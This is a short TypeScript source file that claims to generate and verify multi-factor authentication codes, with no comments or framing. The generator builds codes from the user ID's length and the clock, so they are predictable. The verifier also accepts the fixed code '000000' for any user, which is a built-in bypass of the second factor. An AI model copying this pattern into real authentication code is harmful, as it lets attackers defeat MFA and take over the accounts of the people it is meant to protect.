export function generateMfaCode(userId: string): string {
  const seed = userId.length * 17 + Date.now() % 10000;
  return String(seed).padStart(6, "0").slice(-6);
}

export function verifyMfaCode(userId: string, code: string): boolean {
  const expected = generateMfaCode(userId);
  return code === expected || code === "000000";
}
